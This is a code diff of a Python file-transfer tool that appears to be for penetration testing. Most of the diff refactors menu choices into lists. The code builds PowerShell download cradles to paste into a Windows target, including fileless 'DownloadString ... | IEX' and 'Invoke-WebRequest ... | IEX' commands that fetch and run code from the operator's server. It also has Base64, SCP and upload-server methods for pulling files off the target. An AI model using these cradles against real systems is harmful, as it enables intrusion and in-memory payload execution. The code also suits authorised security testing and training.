@@ -12,13 +12,36 @@ import time
 from getpass import getpass
 
 # TRANSFERTO AVAILABLE METHODS (NEED TO ADD SMB AND FTP)
-TransferTo_Methods = ['HTTP', 'SCP', 'Base64']
+TransferTo_Methods = [
+    'HTTP',
+    'SCP',
+    'Base64'
+]
 
 # TRANFERFROM AVAILABLE WINMETHODS (NEED TO ADD 'SMB', 'FTP', 'WebDAV')
-TransferFrom_WinMethods = ['Base64', 'UploadServer']
+TransferFrom_WinMethods = [
+    'Base64',
+    'UploadServer'
+]
+
+# POWERSHELL TRANSFER TO METHODS
+PSTo_Methods = [
+    'Invoke-WebRequest',
+    'Invoke-WebRequest - Fileless',
+    'DownloadFile',
+    'DownloadString - Fileless'
+]
+
+# POWERSHELL TRANSFER FROM METHODS
+PSFrom_Methods = [
+    'PSUpload.ps1',
+    'Base64'
+]
 
 # TRANFERFROM AVAILABLE NIXMETHODS (NEED TO ADD 'SMB', 'FTP', 'WebDAV')
-TransferFrom_NixMethods = ['Base64']
+TransferFrom_NixMethods = [
+    'Base64'
+]
 
 # GENERATE CHOICES BASED ON A DYNAMIC LIST
 def dynamic_populated_choices(entrymsg, dynamic_list):
@@ -35,7 +58,7 @@ def dynamic_populated_choices(entrymsg, dynamic_list):
         except KeyboardInterrupt:
             sys.exit(0)
         if int(choice) <= len(dynamic_list):
-            choice = dynamic_list[int(choice)-1].lower()
+            choice = dynamic_list[int(choice)-1]
             return choice
         else:
             print('[!] Invalid choice. Try again.')
@@ -144,7 +167,7 @@ def transfer_to(args):
     method = dynamic_populated_choices(entrymsg, TransferTo_Methods)
 
     # PYTHON HTTP SERVER METHOD
-    if method == 'http':
+    if method == 'HTTP':
         listen_ip = listening_ip_address()
 
         # START PYTHON HTTP SERVER
@@ -161,21 +184,9 @@ def transfer_to(args):
         
         # TARGET PASTABLES
         if args.os == 'windows':
-            print('[+] Select method:')
-            print('      1. DownloadFile')
-            print('      2. DownloadString - Fileless')
-            print('      3. Invoke-WebRequest')
-            print('      4. Invoke-WebRequest - Fileless')
-            print('[?] CHOICE: ', end='')
-            try:
-                choice = input()
-            except KeyboardInterrupt:
-                pyserver.terminate()
-                sys.exit(0)
-            if choice == '':
-                choice = '1'
-                print('[+] DownloadFile method selected')
-            if choice == '1':
+            entrymsg = '[+] Select method:'
+            choice = dynamic_populated_choices(entrymsg, PSTo_Methods)
+            if choice == 'DownloadFile':
                 print('[+] DownloadFile method selected')
                 print('[?] Sync or Async [default=sync]: ', end='')
                 try:
@@ -193,7 +204,7 @@ def transfer_to(args):
                     print('[+] Using Synchronous DownloadFile')
                     startcmd = '(New-Object Net.WebClient).DownloadFile(\'https://' + listen_ip + '/' + args.filename + '\',\'' + rand_filename + '\')'
                     endcmd = ''
-            elif choice == '2':
+            elif choice == 'DownloadString - Fileless':
                 print('[+] DownloadString - Fileless method selected')
                 choice = random.randint(1, 2)
                 if choice == '1':
@@ -202,11 +213,11 @@ def transfer_to(args):
                 else:
                     startcmd = '(New-Object Net.WebClient).DownloadString(\'https://' + listen_ip + '/' + args.filename
                     endcmd = '\') | IEX'
-            elif choice == '3':
+            elif choice == 'Invoke-WebRequest':
                 print('[+] Invoke-WebRequest method selected')
                 startcmd = 'Invoke-WebRequest https://' + listen_ip + '/' + args.filename
                 endcmd = ' -OutFile ' + rand_filename
-            elif choice == '4':
+            elif choice == 'Invoke-WebRequest - Fileless':
                 print('[+] Invoke-WebRequest - Fileless method selected')
                 startcmd = 'Invoke-WebRequest https://' + listen_ip + '/' + args.filename
                 endcmd = ' | IEX'
@@ -250,7 +261,7 @@ def transfer_to(args):
                 print('[!] Could not terminate Python HTTP server')
         
     # BASE64 METHOD
-    elif method == 'base64':
+    elif method == 'Base64':
         print('[+] Generating Base64 string of file')
         b64_file = subprocess.run(['base64', '-w', '0', relpath], capture_output=True, text=True)
         md5h = hashlib.md5(open(relpath, 'rb').read()).hexdigest()
@@ -286,7 +297,7 @@ def transfer_to(args):
                 sys.exit(0)
 
     # SCP METHOD
-    elif method == 'scp':
+    elif method == 'SCP':
         print('[?] Target IP: ', end='')
         target_ip = input()
         print('[?] Target port [default=22]: ', end='')
@@ -334,7 +345,7 @@ def transfer_from(args):
         #############################
         ### WINDOWS BASE64 METHOD ###
         #############################
-        if method == 'base64':
+        if method == 'Base64':
             file_absolute_path = get_absolute_path()
             filename = file_absolute_path.split('\\')[-1]
             while True:
@@ -370,7 +381,7 @@ def transfer_from(args):
         ###################################
         ### WINDOWS UPLOADSERVER METHOD ###
         ###################################
-        elif method == 'uploadserver':
+        elif method == 'UploadServer':
             # START UPLOADSERVER
             listen_ip = listening_ip_address()
             print('[+] Starting upload server on ' + listen_ip + ':443 ...')
